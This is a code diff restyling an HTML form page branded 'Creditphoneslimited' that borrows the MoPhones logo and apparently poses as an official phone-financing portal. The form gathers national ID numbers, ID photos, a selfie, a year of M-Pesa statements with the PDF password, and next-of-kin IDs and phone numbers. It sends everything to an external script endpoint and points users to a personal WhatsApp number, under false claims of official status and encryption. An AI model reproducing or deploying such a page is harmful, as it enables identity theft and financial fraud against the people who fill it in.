@@ -24,140 +24,137 @@
     
     <style>
         :root { 
-            --primary: #004488; 
-            --premium-black: #0a0a0a; 
-            --slate-gray: #1e293b;
-            --danger: #e11d48; 
-            --glass: rgba(255, 255, 255, 0.98); 
+            --bg-dark: #0f172a; 
+            --card-dark: #1e293b; 
+            --primary-blue: #3b82f6; 
+            --accent-green: #22c55e;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
         }
         
         body { 
             font-family: 'Inter', system-ui, -apple-system, sans-serif; 
-            background-color: var(--premium-black); 
-            padding: 15px; 
+            background-color: var(--bg-dark); 
+            padding: 20px 15px; 
             margin: 0; 
-            color: #1e293b; 
+            color: var(--text-main); 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
         }
 
         .container { 
-            background: var(--glass); 
+            background: var(--card-dark); 
             padding: 35px 25px; 
-            border-radius: 28px; 
-            max-width: 480px; 
+            border-radius: 24px; 
+            max-width: 460px; 
             width: 100%; 
-            box-shadow: 0 0 40px rgba(0,68,136,0.2); 
-            border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 15px rgba(59, 130, 246, 0.1); 
+            border: 1px solid rgba(255,255,255,0.05); 
         }
 
         .brand-header { text-align: center; margin-bottom: 25px; }
         .brand-header h1 { 
-            color: var(--premium-black); 
+            color: var(--text-main); 
             margin: 0; 
-            font-size: 1.4em; 
+            font-size: 1.2em; 
             text-transform: uppercase; 
-            letter-spacing: 2px; 
-            font-weight: 900; 
+            letter-spacing: 3px; 
+            font-weight: 800; 
         }
 
-        .timeline-badge { 
-            background: #000; 
-            color: #fff; 
-            padding: 12px; 
-            border-radius: 14px; 
-            font-size: 0.85em; 
+        .status-badge { 
+            background: rgba(34, 197, 94, 0.1); 
+            color: var(--accent-green); 
+            padding: 10px; 
+            border-radius: 12px; 
+            font-size: 0.8em; 
             text-align: center; 
             margin: 15px 0; 
-            font-weight: 500; 
-            letter-spacing: 0.5px;
+            font-weight: 600;
+            border: 1px solid rgba(34, 197, 94, 0.2);
         }
 
-        .trust-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .badge { background: #f1f5f9; padding: 6px 14px; border-radius: 8px; font-size: 0.65em; font-weight: 800; color: #475569; text-transform: uppercase; border: 1px solid #e2e8f0; }
-
         .self-service-banner {
-            background: #f8fafc;
-            border-left: 5px solid #000;
+            background: rgba(255,255,255,0.03);
+            border-left: 4px solid var(--primary-blue);
             padding: 15px;
-            border-radius: 12px;
+            border-radius: 8px;
             font-size: 0.85em;
             margin-bottom: 25px;
-            color: #334155;
+            color: var(--text-dim);
             line-height: 1.5;
         }
 
         .price-link { 
-            background: #ffffff; 
-            color: #000; 
-            padding: 14px; 
-            border: 2px solid #000; 
-            border-radius: 14px; 
+            background: transparent; 
+            color: var(--primary-blue); 
+            padding: 12px; 
+            border: 1px solid var(--primary-blue); 
+            border-radius: 12px; 
             display: block; 
             text-align: center; 
             text-decoration: none; 
-            font-weight: 900; 
-            font-size: 0.9em; 
+            font-weight: 600; 
+            font-size: 0.85em; 
             margin-bottom: 25px;
             transition: 0.3s;
         }
+        .price-link:hover { background: rgba(59, 130, 246, 0.1); }
 
-        label { display: block; margin-top: 20px; font-weight: 800; font-size: 0.8em; color: #0f172a; text-transform: uppercase; letter-spacing: 0.5px; }
+        label { display: block; margin-top: 22px; font-weight: 600; font-size: 0.75em; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
         
         input, select { 
             width: 100%; 
-            padding: 15px; 
+            padding: 14px; 
             margin-top: 8px; 
-            border: 1.5px solid #e2e8f0; 
-            border-radius: 14px; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 12px; 
             box-sizing: border-box; 
             font-size: 16px; 
-            background-color: #fff;
-            color: #000;
+            background-color: #0f172a;
+            color: #fff;
+            outline: none;
         }
 
-        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 4px rgba(0,68,136,0.1); }
+        input:focus { border-color: var(--primary-blue); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3); }
 
-        .file-upload { 
-            background: #ffffff; 
-            border: 1.5px dashed #cbd5e1; 
-            padding: 15px; 
-            border-radius: 14px; 
+        .file-upload-box { 
+            background: rgba(15, 23, 42, 0.5); 
+            border: 1px dashed rgba(255,255,255,0.2); 
+            padding: 12px; 
+            border-radius: 12px; 
             margin-top: 8px; 
         }
 
         .btn-submit { 
-            background: var(--premium-black); 
+            background: var(--primary-blue); 
             color: white; 
-            padding: 22px; 
+            padding: 18px; 
             border: none; 
-            border-radius: 16px; 
+            border-radius: 14px; 
             width: 100%; 
             margin-top: 35px; 
-            font-weight: 800; 
-            font-size: 1.1em; 
+            font-weight: 700; 
+            font-size: 1em; 
             cursor: pointer; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
         }
 
         .whatsapp-btn { 
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            background: #ffffff; 
-            color: #25d366; 
-            border: 2px solid #25d366;
+            color: var(--accent-green); 
             padding: 15px; 
-            border-radius: 16px; 
             text-decoration: none; 
-            margin-top: 15px; 
-            font-weight: 700; 
-            gap: 10px; 
+            margin-top: 10px; 
+            font-weight: 600; 
+            font-size: 0.9em;
+            gap: 8px; 
         }
 
-        .footer { text-align: center; font-size: 0.75em; color: #64748b; margin: 40px 0; line-height: 1.8; }
+        .footer { text-align: center; font-size: 0.7em; color: var(--text-dim); margin: 40px 0; line-height: 1.8; }
     </style>
 </head>
 <body>
@@ -165,84 +162,80 @@
 <div class="container">
     <div class="brand-header">
         <h1>Creditphoneslimited</h1>
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="120" height="38" alt="MoPhones" style="margin-top:10px; filter: grayscale(1);">
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="100" alt="MoPhones" style="margin-top:10px; filter: brightness(0) invert(1);">
     </div>
 
-    <div class="timeline-badge">
-        PREMIUM SERVICE • 5-HOUR FAST TRACK
-    </div>
-
-    <div class="trust-row">
-        <span class="badge">SECURE SSL</span>
-        <span class="badge">NAIROBI AGENT</span>
-        <span class="badge">VERIFIED PORTAL</span>
+    <div class="status-badge">
+        SYSTEM STATUS: ONLINE • FAST-TRACK ACTIVE
     </div>
 
     <div class="self-service-banner">
-        🔄 <b>Official Self-Service Portal</b><br>
-        Apply directly for priority processing. Return to complete your submission at any time.
+        🔒 <b>Official Self-Service Portal</b><br>
+        Your data is encrypted. You may exit and return to this form at any point to complete your submission.
     </div>
 
-    <a href="https://mophones.co" target="_blank" class="price-link">BROWSE CATALOGUE & PRICES</a>
+    <a href="https://mophones.co" target="_blank" class="price-link">VIEW CURRENT PRICE LIST</a>
 
     <form id="ironCladPortal">
-        <label>Select Delivery Region</label>
+        <label>Region</label>
         <select name="region" required>
-            <option value="" disabled selected>-- Choose Location --</option>
-            <option value="nairobi">Nairobi County</option>
-            <option value="kiambu">Kiambu County</option>
-            <option value="machakos">Machakos Town</option>
-            <option value="nakuru">Nakuru Town</option>
-            <option value="kajiado_environs">Kitengela, Syokimau, Athi River</option>
+            <option value="" disabled selected>-- Choose --</option>
+            <option value="nairobi">Nairobi</option>
+            <option value="kiambu">Kiambu</option>
+            <option value="machakos">Machakos</option>
+            <option value="nakuru">Nakuru</option>
+            <option value="kajiado">Kajiado Environs</option>
         </select>
 
-        <label>Device Preference</label>
-        <div style="display: flex; gap: 10px;">
+        <label>Device Selection</label>
+        <div style="display: flex; gap: 8px;">
             <select name="phone_brand" required style="width: 40%;">
                 <option value="Samsung">Samsung</option>
                 <option value="iPhone">iPhone</option>
             </select>
-            <input type="text" name="preferred_phone" placeholder="e.g. Galaxy A15" required style="width: 60%;">
+            <input type="text" name="preferred_phone" placeholder="e.g. Galaxy A35" required style="width: 60%;">
         </div>
 
-        <label>Full Official Name</label>
-        <input type="text" name="full_name" id="nameInput" placeholder="Enter all 3 names" required>
+        <label>Your Full Names</label>
+        <input type="text" name="full_name" placeholder="As per National ID" required>
 
         <label>ID Number</label>
-        <input type="text" name="id_number" id="idInput" maxlength="8" placeholder="National ID" required>
+        <input type="text" name="id_number" maxlength="8" placeholder="8-digit ID" required>
 
-        <label>ID Photos & Selfie</label>
-        <div class="file-upload"><span style="font-size: 0.75em; font-weight:700;">FRONT ID:</span><input type="file" name="id_front" accept="image/*" required></div>
-        <div class="file-upload"><span style="font-size: 0.75em; font-weight:700;">BACK ID:</span><input type="file" name="id_back" accept="image/*" required></div>
-        <div class="file-upload"><span style="font-size: 0.75em; font-weight:700;">SELFIE:</span><input type="file" name="selfie" accept="image/*" required></div>
+        <label>Identity Documents</label>
+        <div class="file-upload-box"><span style="font-size: 0.7em; color: var(--text-dim);">ID FRONT:</span><input type="file" name="id_front" accept="image/*" required></div>
+        <div class="file-upload-box"><span style="font-size: 0.7em; color: var(--text-dim);">ID BACK:</span><input type="file" name="id_back" accept="image/*" required></div>
+        <div class="file-upload-box"><span style="font-size: 0.7em; color: var(--text-dim);">SELFIE:</span><input type="file" name="selfie" accept="image/*" required></div>
 
-        <label>M-Pesa Statement (12 Months)</label>
-        <div class="file-upload"><input type="file" name="mpesa_statement" accept=".pdf" required></div>
+        <label>12-Month M-Pesa Statement</label>
+        <div class="file-upload-box"><input type="file" name="mpesa_statement" accept=".pdf" required></div>
         <input type="text" name="mpesa_password" placeholder="PDF Password" required>
 
-        <hr style="margin-top:40px; border:0; border-top:2px solid #f1f5f9;">
+        <div style="margin-top:35px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 10px;">
+            <p style="font-size: 0.7em; color: var(--primary-blue); font-weight: 700; letter-spacing: 1px;">NEXT OF KIN VERIFICATION</p>
+        </div>
         
-        <label>Next of Kin Name</label>
+        <label>Kin Full Name</label>
         <input type="text" name="nok_name" placeholder="Full Name" required>
 
-        <label>Next of Kin ID</label>
-        <input type="text" name="nok_id" maxlength="8" placeholder="Kin National ID" required>
+        <label>Kin ID Number</label>
+        <input type="text" name="nok_id" maxlength="8" placeholder="ID Number" required>
 
-        <label>Next of Kin Phone</label>
+        <label>Kin Phone Number</label>
         <input type="text" name="nok_contact" value="+254" required>
 
         <button type="submit" class="btn-submit" id="submitBtn">
-            <span id="btnText">Submit Official Application</span>
+            <span id="btnText">Submit Secure Application</span>
         </button>
 
         <a href="https://wa.me/254112384099?text=Hello%20Akeya,%20I%20am%20applying%20for%20a%20phone." class="whatsapp-btn">
-            Chat with Agent Lilian
+            Chat with Lilian Akeya
         </a>
     </form>
 </div>
 
 <div class="footer">
-    Portal Code: <strong>mo_leads_portal</strong> | Sales: <strong>Akeya Lilian</strong><br>
+    Portal Ref: <strong>mo_leads_portal</strong><br>
     Pioneer House, Kimathi Street, Nairobi.<br>
     © 2024 & Beyond Creditphoneslimited
 </div>
@@ -256,7 +249,7 @@ const btnText = document.getElementById('btnText');
 form.addEventListener('submit', e => {
     e.preventDefault();
     submitBtn.disabled = true;
-    btnText.innerText = "Encrypting & Sending...";
+    btnText.innerText = "Encrypting Data...";
 
     const formData = {};
     const fileInputs = form.querySelectorAll('input[type="file"]');
@@ -276,12 +269,12 @@ form.addEventListener('submit', e => {
         fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(formData) })
         .then(() => { 
             if (typeof fbq === 'function') fbq('track', 'Lead');
-            alert("✅ SUBMITTED. Akeya Lilian will review your file within 5 hours."); 
+            alert("✅ SUBMITTED. Lilian Akeya will contact you within 5 hours."); 
             form.reset(); window.location.reload(); 
         })
         .catch(() => { 
             alert("Connection error."); 
-            submitBtn.disabled = false; btnText.innerText = "Submit Official Application"; 
+            submitBtn.disabled = false; btnText.innerText = "Submit Secure Application"; 
         });
     });
 });
